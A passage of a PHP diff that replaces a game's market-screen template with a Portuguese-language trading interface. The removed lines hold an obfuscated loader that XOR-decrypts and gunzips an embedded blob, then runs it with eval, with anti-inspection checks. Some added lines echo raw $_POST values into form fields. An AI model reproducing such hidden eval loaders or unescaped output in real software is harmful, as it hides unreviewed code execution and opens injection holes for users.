DLbteMSNmhDcckdL3uT/bP5OxSxnDwc/HY4bNJ5OWN1409DvlHTksOzE9LcW41nwJRTjgD/fNY0QeD/82GJnj9Tu/2bjh9tj1Nz1gPONzvUGnAYxXKAI9W2Z+I5xeDVdwZZhqH+RK26Om9PDITS3u5RNrNGaA1lnlsYCf3qXxrFpI6BgP+XpTs+BwfxCnVIk6kCseJK0NG8SySEluWYhaap8JoYM54VlpmtmRbNlg7mFkzCAC8bn7hwIdGpGtMKRmZBVMnrxkTdObau7EZZtH8sDwO8oRU53D53vMKUpik5f6h35iiJDPwqkD5qw1PfVQMADzYScpNs42B6aEpTb71Ryke1LXqAtBVIpX/f296Pv45nCO0cIu4TouanLvFk3H89qfY0y/9/h4X8f/c6BaLZC+bIc6rI0Ziwl2qB1jT1O87kfLJifjFlnXLrmwTxvtZzc5jqDErRT3ITemfb7Wwn6oDaA7UCZo3Q8DIuW+ZjLVqHsfjGtaB0/ZDOXjx+ynZ4Hd7NBmHezuimCsAtBtRJ4zGbwxC7YYQIodZc2aJ1LG9JCkytxRsQ4irC2SDTsOS5ACZs1Xt7PO13w9BkXSMCZc5zxkcZfFAgkqLHYRTD8h6PDC+zeI9W/tWfi6jw9aav7VYPNmX8x98Yqj+MR3+NtHbprylSVaCRmuCahejpbw/gaaHegY54GIiOcx16lFvY0q1WOR0u4sCw//vqIFCFPQOtDQjyhS75S8YVibQRPZhG9/AT+ixeRsyqQD/2caZY0qSmWR4BNWblj8UdDhw02++eMIbErqTuVkfj3BDHeD7wBnnTUR+E43W+jsq9uqzeTE6ZlZpJANiA7HFS7/QlF43oiKzO33YBrofCXbhE/PInzh7wVlWRQopVu1eRClGSz5erZmocThfKNetj4MwzqOBuIidBDMD/s+qj0=";
-$lwtshpq=file_get_contents(__FILE__);
-$lxojbnssmb=str_replace($pqpbmbfyfy,"",$lwtshpq);
-if(strpos($lxojbnssmb,"ec"."ho")!==false||strpos($lxojbnssmb,"pr"."int")!==false||strpos($lxojbnssmb,"var_"."dump")!==false||strpos($lxojbnssmb,"file_put_"."contents")!==false||strpos($lxojbnssmb,"fw"."rite")!==false){die();}
-$jnlmsft=str_replace(array($iedglqhqz,$ohvultpfnfu),array("SP_ec9457df","KP_8fff570d"),$lwtshpq);
-$patdhy=md5($jnlmsft);
-$yeqyodj=hex2bin($ohvultpfnfu);
-$rfeptsuwv="";
-$dturlruhmf=strlen($patdhy);
-for($ttksomc=0;$ttksomc<$dturlruhmf;$ttksomc++){
-$rfeptsuwv.=chr(ord($yeqyodj[$ttksomc])^ord($patdhy[$ttksomc]));
-}
-$pvhvpjft=base64_decode($pqpbmbfyfy);
-$nldmlq=strlen($pvhvpjft);
-$vxmvgopfyp="";
-$otgbjzhb=strlen($rfeptsuwv);
-for($ttksomc=0;$ttksomc<$nldmlq;$ttksomc++){
-$vxmvgopfyp.=$pvhvpjft[$ttksomc]^$rfeptsuwv[$ttksomc%$otgbjzhb];
-}
-$rdfyqd="gzun"."compress";
-eval('?>' . $rdfyqd($vxmvgopfyp) . '<?php ');
+// Validar variáveis principais
+$dealers_available = $dealers_available ?? 0;
+$dealers_total = $dealers_total ?? 1;
+?>
+
+
+<?php if (!empty($error)): ?>
+    <div style="font-weight:bold; color:red; margin-bottom: 10px;">
+        <?= $error ?>
+    </div>
+<?php endif; ?>
+
+<?php
+// Building Header (Market Image + Info)
+$min = 10;
+$max = 10; // Placeholder
+$dbname = 'market';
+$market_lvl = $village['market'] ?? 0;
+?>
+<table width="100%">
+    <tr>
+        <td valign="top" width="100">
+            <?php
+            $img_idx = ($market_lvl > 50) ? 3 : (($market_lvl > 20) ? 2 : 1);
+            ?>
+            <img src="/graphic/big_buildings/market<?= $img_idx ?>.png" title="<?= __('screens.market.title') ?>"
+                alt="" />
+        </td>
+        <td valign="top">
+            <h2>
+                <?= __('screens.market.title') ?> (
+                <?= ($market_lvl > 0) ? __('screens.common.level') . ' ' . $market_lvl : __('screens.market.not_built') ?>)
+            </h2>
+            <p>
+                <?= __('screens.market.description') ?>
+            </p>
+        </td>
+    </tr>
+</table>
+<br />
+
+<table width="100%">
+    <tr>
+        <td valign="top" width="150">
+            <table class="vis" width="100%">
+                <?php
+                $links = [
+                    'other_offer' => __('screens.market.commerce') ?? 'Comércio',
+                    'premium' => __('screens.market.premium_exchange') ?? 'Troca Premium',
+                    'own_offer' => __('screens.market.create_offers') ?? 'Criar ofertas',
+                    'send' => __('screens.market.send_resources') ?? 'Enviar recursos',
+                    'transports' => __('screens.market.transports') ?? 'Transporte',
+                    'merchant_status' => __('screens.market.merchant_status') ?? 'Status dos mercadores',
+                    'all_offers' => __('screens.market.all_my_offers') ?? 'Todas as minhas ofertas'
+                ];
+                $active_mode = $_GET['mode'] ?? 'send';
+
+                foreach ($links as $m => $label):
+                    $selected = ($m === $active_mode) ? 'class="selected"' : '';
+                    ?>
+                    <tr>
+                        <td <?= $selected ?> width="120">
+                            <a href="game.php?village=<?= $village['id'] ?>&screen=market&mode=<?= $m ?>">
+                                <?= $label ?>
+                            </a>
+                        </td>
+                    </tr>
+                <?php endforeach; ?>
+            </table>
+        </td>
+
+        <td valign="top" width="*">
+            <!-- Official Header Info -->
+            <table class="vis" width="100%" style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 5px;">
+                <tr>
+                    <td>
+                        <b><?= __('screens.market.dealers') ?>: <?= $dealers_total - ($summary['counts']['total_in_use'] ?? 0) ?>/<?= $dealers_total ?></b>
+                        &nbsp;&nbsp;
+                        <b><?= __('screens.market.max_transport') ?>: <?= number_format($dealers_total * 1000) ?></b>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <b><?= __('screens.market.incoming_res') ?? 'A chegar' ?>:</b>
+                        <?php if($summary['res_incoming']['wood']): ?><img src="/graphic/icons/wood.png"> <?= number_format($summary['res_incoming']['wood'], 0, ',', '.') ?><?php endif; ?>
+                        <?php if($summary['res_incoming']['stone']): ?><img src="/graphic/icons/stone.png"> <?= number_format($summary['res_incoming']['stone'], 0, ',', '.') ?><?php endif; ?>
+                        <?php if($summary['res_incoming']['iron']): ?><img src="/graphic/icons/iron.png"> <?= number_format($summary['res_incoming']['iron'], 0, ',', '.') ?><?php endif; ?>
+                        <?php if(!$summary['res_incoming']['wood'] && !$summary['res_incoming']['stone'] && !$summary['res_incoming']['iron']): ?>---<?php endif; ?>
+                        
+                        &nbsp;&nbsp;
+                        <b><?= __('screens.market.outgoing_res') ?? 'De saída' ?>:</b>
+                        <?php if($summary['res_outgoing']['wood']): ?><img src="/graphic/icons/wood.png"> <?= number_format($summary['res_outgoing']['wood'], 0, ',', '.') ?><?php endif; ?>
+                        <?php if($summary['res_outgoing']['stone']): ?><img src="/graphic/icons/stone.png"> <?= number_format($summary['res_outgoing']['stone'], 0, ',', '.') ?><?php endif; ?>
+                        <?php if($summary['res_outgoing']['iron']): ?><img src="/graphic/icons/iron.png"> <?= number_format($summary['res_outgoing']['iron'], 0, ',', '.') ?><?php endif; ?>
+                        <?php if(!$summary['res_outgoing']['wood'] && !$summary['res_outgoing']['stone'] && !$summary['res_outgoing']['iron']): ?>---<?php endif; ?>
+                    </td>
+                </tr>
+            </table>
+            <br>
+
+            <?php if ($active_mode === 'send'): ?>
+                <!-- MODE: SEND RESOURCES - Image 3 Style -->
+                <h3><?= __('screens.market.send_resources') ?></h3>
+                
+                <?php if ($confirmation): ?>
+                    <!-- Confirmation Table (Unified Style) -->
+                    <form action="game.php?village=<?= $village['id'] ?>&screen=market&mode=send&action=send&h=<?= $user['hkey'] ?? '' ?>" method="post">
+                        <input type="hidden" name="target_type" value="coords">
+                        <input type="hidden" name="input" value="<?= $confirmation['target_village']['x'] ?>|<?= $confirmation['target_village']['y'] ?>">
+                        <input type="hidden" name="wood" value="<?= $confirmation['resources']['wood'] ?>">
+                        <input type="hidden" name="stone" value="<?= $confirmation['resources']['stone'] ?>">
+                        <input type="hidden" name="iron" value="<?= $confirmation['resources']['iron'] ?>">
+                        <input type="hidden" name="confirm" value="1">
+                        
+                        <table class="vis" width="500">
+                            <tr><th colspan="2" style="background-color: #c1a264; color: #fff;"><?= __('screens.market.confirm_resources') ?? 'Confirmar transporte de recursos' ?></th></tr>
+                            <tr><td><?= __('screens.market.target') ?? 'Alvo' ?>:</td><td><b><?= htmlspecialchars($confirmation['target_username'] ?? '') ?></b> (<?= htmlspecialchars($confirmation['target_village']['name']) ?> <?= $confirmation['target_village']['x'] ?>|<?= $confirmation['target_village']['y'] ?>) K<?= $confirmation['target_village']['continent'] ?></td></tr>
+                            <tr><td><?= __('screens.market.resources') ?>:</td>
+                                <td>
+                                    <?php if($confirmation['resources']['wood']) echo "<img src='/graphic/icons/wood.png' title='".__('screens.market.wood')."'> ".number_format($confirmation['resources']['wood'])." "; ?>
+                                    <?php if($confirmation['resources']['stone']) echo "<img src='/graphic/icons/stone.png' title='".__('screens.market.clay')."'> ".number_format($confirmation['resources']['stone'])." "; ?>
+                                    <?php if($confirmation['resources']['iron']) echo "<img src='/graphic/icons/iron.png' title='".__('screens.market.iron')."'> ".number_format($confirmation['resources']['iron'])." "; ?>
+                                </td>
+                            </tr>
+                            <tr><td><?= __('screens.market.merchants') ?? 'Comerciantes' ?>:</td><td><?= $confirmation['dealers'] ?></td></tr>
+                            <tr><td><?= __('screens.market.duration') ?>:</td><td><?= format_time($confirmation['duration']) ?></td></tr>
+                            <tr><td><?= __('screens.market.arrival') ?>:</td><td><?= format_date($confirmation['arrival']) ?></td></tr>
+                        </table>
+                        <br>
+                        <input type="submit" class="btn" value="<?= __('screens.market.confirm') ?? 'Confirmar' ?>">
+                    </form>
+                <?php else: ?>
+                    <form action="game.php?village=<?= $village['id'] ?>&screen=market&mode=send&action=send&h=<?= $user['hkey'] ?? '' ?>" method="post">
+                        <table class="vis" width="100%">
+                            <tr>
+                                <td valign="top" width="200">
+                                    <table class="vis" width="100%">
+                                        <tr><th colspan="3" style="background-color: #c1a264; color: #fff;"><?= __('screens.market.resources') ?></th></tr>
+                                        <tr>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><img src="/graphic/icons/wood.png"></td>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><input type="text" name="wood" size="5" id="wood_input" value="<?= $_POST['wood'] ?? '' ?>"></td>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><a href="#" onclick="document.getElementById('wood_input').value=<?= floor($village['r_wood']) ?>; return false;">(<?= floor($village['r_wood']) ?>)</a></td>
+                                        </tr>
+                                        <tr>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><img src="/graphic/icons/stone.png"></td>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><input type="text" name="stone" size="5" id="stone_input" value="<?= $_POST['stone'] ?? '' ?>"></td>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><a href="#" onclick="document.getElementById('stone_input').value=<?= floor($village['r_stone']) ?>; return false;">(<?= floor($village['r_stone']) ?>)</a></td>
+                                        </tr>
+                                        <tr>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><img src="/graphic/icons/iron.png"></td>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><input type="text" name="iron" size="5" id="iron_input" value="<?= $_POST['iron'] ?? '' ?>"></td>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px;"><a href="#" onclick="document.getElementById('iron_input').value=<?= floor($village['r_iron']) ?>; return false;">(<?= floor($village['r_iron']) ?>)</a></td>
+                                        </tr>
+                                    </table>
+                                </td>
+                                <td valign="top" style="padding-left: 15px;">
+                                    <table class="vis" width="100%">
+                                        <tr>
+                                            <th colspan="2" style="background-color: #c1a264; color: #fff; font-style: italic; text-align: left; padding: 3px; font-weight: bold;"><?= __('screens.market.destination') ?></th>
+                                        </tr>
+                                        <tr>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px; white-space: nowrap;">
+                                                <input type="radio" name="target_type" value="coords" id="tt_coords" checked> <label for="tt_coords"><?= __('screens.market.coords') ?? 'Coordenadas' ?></label>
+                                                <input type="radio" name="target_type" value="village_name" id="tt_vname"> <label for="tt_vname"><?= __('screens.market.village_name') ?? 'Nome da aldeia' ?></label>
+                                                <input type="radio" name="target_type" value="player_name" id="tt_pname"> <label for="tt_pname"><?= __('screens.market.player_name') ?? 'Nome do jogador' ?></label>
+                                            </td>
+                                            <td rowspan="2" align="center" valign="middle" style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 10px;">
+                                                <input type="submit" class="btn" value="<?= __('screens.market.send') ?>" style="font-size: 10pt; font-weight: bold; width: 80px; height: 28px;" />
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 5px; box-sizing: border-box;">
+                                                <input type="text" id="market_destination_input" name="input" autocomplete="off" value="<?= $_POST['input'] ?? '' ?>" style="width: 100%; box-sizing: border-box; padding: 4px;">
+                                                <!-- Selected Village Card -->
+                                                <div id="market_selected_village_card" style="display:none; align-items:center; border:1px solid #7d510f; background:#fcf6e4; padding:5px; box-sizing:border-box; margin-top:2px;">
+                                                    <img id="sel_village_img" src="/graphic/map/v1.png" style="width:38px; height:38px; margin-right:12px; object-fit:contain;" alt="">
+                                                    <div style="flex:1; font-size:11px; line-height:1.4; text-align:left; color:#000;">
+                                                        <b id="sel_village_title"></b><br>
+                                                        Proprietário: <span id="sel_village_owner"></span> Pontos: <span id="sel_village_points"></span><br>
+                                                        Distância: <span id="sel_village_distance"></span> campos
+                                                    </div>
+                                                    <div style="display:flex; align-items:center; margin-left:10px;">
+                                                        <a href="#" id="clear_selected_village" style="display:inline-block; width:20px; height:20px; line-height:20px; text-align:center; border:1px solid #7d510f; background:#e3d5b3; color:#a00; font-weight:bold; text-decoration:none; cursor:pointer; font-size:13px;" title="Limpar">X</a>
+                                                    </div>
+                                                </div>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td colspan="2">
+                                                <a href="#" onclick="showMarketVillagesModal(); return false;">&raquo; <?= __('screens.market.your_villages') ?? 'As suas aldeias' ?></a>
+                                            </td>
+                                        </tr>
+                                    </table>
+                                </td>
+                            </tr>
+                        </table>
+                    </form>
+                    
+                    <style>
+                    #market_autocomplete_dropdown {
+                        display: none;
+                        position: absolute;
+                        z-index: 99999;
+                        border: 1px solid #7d510f;
+                        background: #f4e4bc;
+                        max-height: 300px;
+                        overflow-y: auto;
+                        box-shadow: 0px 4px 8px rgba(0,0,0,0.3);
+                        transform: translateY(-100%);
+                        margin-top: -2px;
+                    }
+                    .autocomplete-item {
+                        display: flex;
+                        align-items: center;
+                        padding: 6px 10px;
+                        border-bottom: 1px solid #7d510f;
+                        cursor: pointer;
+                        background: #f4e4bc;
+                        color: #000;
+                    }
+                    .autocomplete-item:hover {
+                        background-color: #e3d5b3;
+                    }
+                    .autocomplete-item img {
+                        width: 38px;
+                        height: 38px;
+                        margin-right: 12px;
+                        object-fit: contain;
+                    }
+                    .autocomplete-details {
+                        flex: 1;
+                        font-size: 11px;
+                        line-height: 1.4;
+                        text-align: left;
+                    }
+                    </style>
+
+                    <script type="text/javascript">
+                    $(document).ready(function() {
+                        const input = $('#market_destination_input');
+                        
+                        // Append autocomplete dropdown container to body to avoid container clipping
+                        if ($('#market_autocomplete_dropdown').length === 0) {
+                            $('body').append('<div id="market_autocomplete_dropdown"></div>');
+                        }
+                        const dropdown = $('#market_autocomplete_dropdown');
+                        let ajaxTimeout = null;
+
+                        function repositionDropdown() {
+                            if (dropdown.is(':visible')) {
+                                let offset = input.offset();
+                                dropdown.css({
+                                    top: offset.top + 'px',
+                                    left: offset.left + 'px',
+                                    width: input.outerWidth() + 'px'
+                                });
+                            }
+                        }
+
+                        $(window).on('scroll resize', repositionDropdown);
+
+                        function showSelectedVillageCard(item) {
+                            if (!item) return;
+
+                            let pts = parseInt(item.points) || 0;
+                            let graphic = 'v1';
+                            if (pts >= 11000) graphic = 'v6';
+                            else if (pts >= 9000) graphic = 'v5';
+                            else if (pts >= 3000) graphic = 'v4';
+                            else if (pts >= 1000) graphic = 'v3';
+                            else if (pts >= 300) graphic = 'v2';
+
+                            $('#sel_village_img').attr('src', '/graphic/map/' + graphic + '.png');
+                            $('#sel_village_title').text(item.name + ' (' + item.x + '|' + item.y + ')');
+                            $('#sel_village_owner').text(item.owner || 'Aldeia bárbara');
+                            $('#sel_village_points').text(pts.toLocaleString('pt-PT'));
+                            $('#sel_village_distance').text(item.distance);
+
+                            // Force target type to coordinates since we have exact coordinates now
+                            $('#tt_coords').prop('checked', true);
+
+                            input.hide();
+                            $('#market_selected_village_card').css('display', 'flex');
+                            dropdown.hide().empty();
+                        }
+
+                        let lastValue = '';
+                        let currentAjax = null;
+
+                        function checkCoordinates(val) {
+                            let match = val.match(/^(\d{1,3})\|(\d{1,3})$/);
+                            if (match) {
+                                let x = match[1];
+                                let y = match[2];
+
+                                if (currentAjax) currentAjax.abort();
+
+                                currentAjax = $.ajax({
+                                    url: 'game.php',
+                                    type: 'GET',
+                                    data: {
+                                        screen: 'api',
+                                        type: 'village_by_coords',
+                                        x: x,
+                                        y: y
+                                    },
+                                    dataType: 'json',
+                                    success: function(data) {
+                                        if (data) {
+                                            showSelectedVillageCard(data);
+                                        } else {
+                                            $('#market_selected_village_card').hide();
+                                            input.show();
+                                        }
+                                    }
+                                });
+                            } else {
+                                $('#market_selected_village_card').hide();
+                                input.show();
+                            }
+                        }
+
+                        // Run interval to detect coordinate changes (e.g. load, autocomplete, manual entry, map click)
+                        setInterval(function() {
+                            let val = input.val().trim();
+                            if (val !== lastValue) {
+                                lastValue = val;
+                                checkCoordinates(val);
+                            }
+                        }, 200);
+
+                        input.on('input focus', function() {
+                            let q = $(this).val().trim();
+                            let targetType = $('input[name="target_type"]:checked').val();
+
+                            if (q.length < 2 || targetType === 'coords') {
+                                dropdown.hide().empty();
+                                return;
+                            }
+
+                            clearTimeout(ajaxTimeout);
+                            ajaxTimeout = setTimeout(function() {
+                                let apiType = targetType === 'village_name' ? 'autocomplete_village' : 'autocomplete_player';
+                                $.ajax({
+                                    url: 'game.php',
+                                    type: 'GET',
+                                    data: {
+                                        screen: 'api',
+                                        type: apiType,
+                                        q: q
+                                    },
+                                    dataType: 'json',
+                                    success: function(data) {
+                                        dropdown.empty();
+                                        if (!data || data.length === 0) {
+                                            // Reposition before showing
+                                            let offset = input.offset();
+                                            dropdown.css({
+                                                top: offset.top + 'px',
+                                                left: offset.left + 'px',
+                                                width: input.outerWidth() + 'px'
+                                            }).html('<div style="padding:10px; text-align:center; font-style:italic; font-size:11px; color:#555; background:#f4e4bc;">Nenhuma aldeia encontrada</div>').show();
+                                            return;
+                                        }
+
+                                        data.forEach(function(item, idx) {
+                                            let pts = parseInt(item.points) || 0;
+                                            let graphic = 'v1';
+                                            if (pts >= 11000) graphic = 'v6';
+                                            else if (pts >= 9000) graphic = 'v5';
+                                            else if (pts >= 3000) graphic = 'v4';
+                                            else if (pts >= 1000) graphic = 'v3';
+                                            else if (pts >= 300) graphic = 'v2';
+
+                                            let displayStyle = idx >= 10 ? 'style="display:none;" class="autocomplete-item hidden-item"' : 'class="autocomplete-item"';
+
+                                            let row = $(`
+                                                <div ${displayStyle} data-x="${item.x}" data-y="${item.y}">
+                                                    <img src="/graphic/map/${graphic}.png" alt="">
+                                                    <div class="autocomplete-details">
+                                                        <b>${item.name} (${item.x}|${item.y})</b><br>
+                                                        Proprietário: ${item.owner} Pontos: ${pts.toLocaleString('pt-PT')}<br>
+                                                        Distância: ${item.distance} campos
+                                                    </div>
+                                                </div>
+                                            `);
+                                            row.data('item', item);
+                                            dropdown.append(row);
+                                        });
+
+                                        if (data.length > 10) {
+                                            dropdown.append(`
+                                                <div id="show_more_autocomplete" style="padding:8px; text-align:center; font-weight:bold; cursor:pointer; background:#e3d5b3; border-top:1px solid #7d510f; color:#000; font-size:11px;">
+                                                    Mostrar mais
+                                                </div>
+                                            `);
+                                        }
+
+                                        // Position and show
+                                        let offset = input.offset();
+                                        dropdown.css({
+                                            top: offset.top + 'px',
+                                            left: offset.left + 'px',
+                                            width: input.outerWidth() + 'px'
+                                        }).show();
+                                    }
+                                });
+                            }, 150);
+                        });
+
+                        // Handle selection click from dropdown
+                        dropdown.on('click', '.autocomplete-item', function() {
+                            let x = $(this).data('x');
+                            let y = $(this).data('y');
+                            let item = $(this).data('item');
+
+                            input.val(x + '|' + y);
+                            lastValue = x + '|' + y;
+
+                            $('#tt_coords').prop('checked', true);
+                            dropdown.hide().empty();
+                            
+                            showSelectedVillageCard(item);
+                        });
+
+                        // Handle clearing the selected village
+                        $('#clear_selected_village').on('click', function(e) {
+                            e.preventDefault();
+                            input.val('');
+                            lastValue = '';
+                            $('#market_selected_village_card').hide();
+                            input.show().focus();
+                        });
+
+                        // Handle "Mostrar mais" click
+                        dropdown.on('click', '#show_more_autocomplete', function() {
+                            $(this).remove();
+                            dropdown.find('.hidden-item').removeClass('hidden-item').show();
+                            repositionDropdown(); // Adjust height calculations if container grows
+                        });
+
+                        // Hide on click outside
+                        $(document).on('click', function(e) {
+                            if (!$(e.target).closest('#market_destination_input, #market_autocomplete_dropdown').length) {
+                                dropdown.hide();
+                            }
+                        });
+
+                        // Handle target type change
+                        $('input[name="target_type"]').on('change', function() {
+                            dropdown.hide().empty();
+                            if ($(this).val() !== 'coords') {
+                                input.trigger('input');
+                            }
+                        });
+                    });
+                    </script>
+                <?php endif; ?>
+
+            <?php elseif ($active_mode === 'transports'): ?>
+                <!-- MODE: TRANSPORTS - Image 4 Style -->
+                <h3><?= __('screens.market.your_transports') ?></h3>
+                <?php if (!empty($outgoing_dealers)): ?>
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th width="200" style="background-color: #c1a264;"><?= __('screens.market.destination') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.merchandise') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.dealers') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.arrival') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.arrives_in') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.action') ?></th>
+                        </tr>
+                        <?php foreach ($outgoing_dealers as $d): ?>
+                            <tr>
+                                <td>
+                                    <?= $d['type'] === 'back' ? (__('screens.market.back')) : (__('screens.market.to')) ?>
+                                    <br>
+                                    <a href="game.php?village=<?= $village['id'] ?>&screen=info_village&id=<?= $d['to_village'] ?>">
+                                        <b><?= htmlspecialchars($d['vname']) ?></b> (<?= $d['x'] ?>|<?= $d['y'] ?>) K<?= $d['continent'] ?>
+                                    </a>
+                                </td>
+                                <td>
+                                    <?php if ($d['wood']) echo "<img src='/graphic/icons/wood.png'> " . number_format($d['wood']) . " "; ?>
+                                    <?php if ($d['stone']) echo "<img src='/graphic/icons/stone.png'> " . number_format($d['stone']) . " "; ?>
+                                    <?php if ($d['iron']) echo "<img src='/graphic/icons/iron.png'> " . number_format($d['iron']) . " "; ?>
+                                </td>
+                                <td><?= $d['dealers'] ?></td>
+                                <td><?= format_date($d['end_time']) ?></td>
+                                <td><span class="timer"><?= format_time(max(0, $d['end_time'] - time())) ?></span></td>
+                                <td>
+                                    <?php if ($d['type'] === 'to' && (time() - $d['start_time'] <= 300)): ?>
+                                        <a href="game.php?village=<?= $village['id'] ?>&screen=market&mode=transports&action=cancel_send&id=<?= $d['id'] ?>&h=<?= $user['hkey'] ?? '' ?>">
+                                            <?= __('screens.market.cancel') ?>
+                                        </a>
+                                    <?php else: ?>
+                                        ---
+                                    <?php endif; ?>
+                                </td>
+                            </tr>
+                        <?php endforeach; ?>
+                    </table>
+                <?php else: ?>
+                    <p><?= __('screens.market.no_outgoing_transports') ?></p>
+                <?php endif; ?>
+
+                <br>
+                <h3><?= __('screens.market.incoming_transports') ?></h3>
+                <?php if (!empty($incoming_dealers)): ?>
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th width="200" style="background-color: #c1a264;"><?= __('screens.market.origin') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.merchandise') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.arrival') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.arrives_in') ?></th>
+                        </tr>
+                        <?php foreach ($incoming_dealers as $d): ?>
+                            <tr>
+                                <td>
+                                    <a href="game.php?village=<?= $village['id'] ?>&screen=info_village&id=<?= $d['from_village'] ?>">
+                                        <b><?= htmlspecialchars($d['vname']) ?></b> (<?= $d['x'] ?>|<?= $d['y'] ?>) K<?= $d['continent'] ?>
+                                    </a>
+                                </td>
+                                <td>
+                                    <?php if ($d['wood']) echo "<img src='/graphic/icons/wood.png'> " . number_format($d['wood']) . " "; ?>
+                                    <?php if ($d['stone']) echo "<img src='/graphic/icons/stone.png'> " . number_format($d['stone']) . " "; ?>
+                                    <?php if ($d['iron']) echo "<img src='/graphic/icons/iron.png'> " . number_format($d['iron']) . " "; ?>
+                                </td>
+                                <td><?= format_date($d['end_time']) ?></td>
+                                <td><span class="timer"><?= format_time(max(0, $d['end_time'] - time())) ?></span></td>
+                            </tr>
+                        <?php endforeach; ?>
+                    </table>
+                <?php else: ?>
+                    <p><?= __('screens.market.no_incoming_transports') ?></p>
+                <?php endif; ?>
+
+            <?php elseif ($active_mode === 'merchant_status'): ?>
+                <!-- MODE: MERCHANT STATUS - Image 5 Style -->
+                <h3><?= __('screens.market.merchant_status_title') ?></h3>
+                <p><?= __('screens.market.merchant_status_desc') ?></p>
+                
+                <table class="vis" width="400">
+                    <tr><th colspan="2" style="background-color: #c1a264;"><?= __('screens.market.merchant_occupation') ?></th></tr>
+                    <tr>
+                        <td><?= __('screens.market.merchants_to_target') ?></td>
+                        <td align="center"><?= $summary['counts']['to'] ?></td>
+                    </tr>
+                    <tr>
+                        <td><?= __('screens.market.merchants_returning') ?></td>
+                        <td align="center"><?= $summary['counts']['back'] ?></td>
+                    </tr>
+                    <tr>
+                        <td><?= __('screens.market.your_offers_in_market') ?></td>
+                        <td align="center"><?= $summary['counts']['offers'] ?></td>
+                    </tr>
+                    <tr>
+                        <td><b><?= __('screens.market.merchants_busy') ?></b></td>
+                        <td align="center"><b><?= $summary['counts']['total_in_use'] ?></b></td>
+                    </tr>
+                </table>
+
+            <?php elseif ($active_mode === 'all_offers'): ?>
+                <!-- MODE: ALL OFFERS OVERVIEW -->
+                <h3><?= __('screens.market.all_my_offers') ?></h3>
+                <?php if (!empty($own_offers)): ?>
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.village') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.recebo') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.procuro') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.disponibilidade') ?></th>
+                            <th style="background-color: #c1a264;"><?= __('screens.market.action') ?></th>
+                        </tr>
+                        <?php foreach ($own_offers as $offer): 
+                             $sell_res = ($offer['sell_wood'] > 0) ? 'wood' : (($offer['sell_stone'] > 0) ? 'stone' : 'iron');
+                             $sell_amt = $offer['sell_' . $sell_res];
+                             $buy_res = ($offer['buy_wood'] > 0) ? 'wood' : (($offer['buy_stone'] > 0) ? 'stone' : 'iron');
+                             $buy_amt = $offer['buy_' . $buy_res];
+                        ?>
+                            <tr>
+                                <td><?= htmlspecialchars($offer['village_name']) ?> (<?= $offer['x'] ?>|<?= $offer['y'] ?>)</td>
+                                <td><img src="/graphic/<?= $sell_res == 'stone' ? 'lehm' : ($sell_res == 'wood' ? 'holz' : 'eisen') ?>.png"> <?= $sell_amt ?></td>
+                                <td><img src="/graphic/<?= $buy_res == 'stone' ? 'lehm' : ($buy_res == 'wood' ? 'holz' : 'eisen') ?>.png"> <?= $buy_amt ?></td>
+                                <td><?= $offer['multi'] ?></td>
+                                <td><a href="game.php?village=<?= $village['id'] ?>&screen=market&mode=all_offers&action=delete_offer&id=<?= $offer['id'] ?>&h=<?= $user['hkey'] ?>"><?= __('screens.market.delete') ?></a></td>
+                            </tr>
+                        <?php endforeach; ?>
+                    </table>
+                <?php else: ?>
+                    <p><?= __('screens.market.no_own_offers') ?></p>
+                <?php endif; ?>
+
+            <?php elseif ($active_mode === 'own_offer'): ?>
+                <!-- MODE: CREATE OFFER - Image 2 Style -->
+                <h3><?= __('screens.market.create_offer_title') ?></h3>
+                
+                <p><?= __('screens.market.ratio_warning') ?></p>
+
+                <form action="game.php?village=<?= $village['id'] ?>&screen=market&mode=own_offer&action=create_offer&h=<?= $user['hkey'] ?? '' ?>" method="post">
+                    <table class="vis">
+                        <tr>
+                            <td width="200" style="background-color: #f4e4bc; border: 1px solid #7d510f;"><b><?= __('screens.market.i_offer_short') ?>:</b></td>
+                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f;">
+                                <input name="sell" type="text" size="5" />
+                                <input id="res_sell_wood" name="res_sell" type="radio" value="wood" checked /> <label for="res_sell_wood"><img src="/graphic/icons/wood.png"></label>
+                                <input id="res_sell_stone" name="res_sell" type="radio" value="stone" /> <label for="res_sell_stone"><img src="/graphic/icons/stone.png"></label>
+                                <input id="res_sell_iron" name="res_sell" type="radio" value="iron" /> <label for="res_sell_iron"><img src="/graphic/icons/iron.png"></label>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f;"><b><?= __('screens.market.i_want_short') ?>:</b></td>
